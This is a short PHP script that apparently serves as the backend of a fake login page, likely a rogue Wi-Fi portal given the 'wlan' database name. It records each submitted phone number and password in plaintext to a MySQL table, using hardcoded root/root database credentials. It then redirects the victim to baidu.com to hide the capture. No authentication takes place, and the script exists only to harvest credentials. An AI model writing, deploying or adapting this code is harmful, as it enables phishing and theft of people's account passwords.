<?php
$host='127.0.0.1';
$user='root';
$password='root';
$database='wlan';
if (!empty($_POST['username'])&&!empty($_POST['password'])) {
    $phone = $_POST['username'];
    $pass = $_POST['password'];
    $mysqli = new mysqli($host, $user, $password, $database);
    if ($mysqli->connect_errno) {
        echo "Failed to connect to MySQL: (" . $mysqli->connect_errno . ") " . $mysqli->connect_error;
    }
    $mysqli->set_charset("UTF8");
    $stmt = $mysqli->prepare('insert into `new` (`phone`,`pass`) values(?,?)');
    $stmt->bind_param('ss', $phone, $pass);
    $stmt->execute();
    header('location:http://www.baidu.com/');
}else{
    header('location:index.html');
}
?>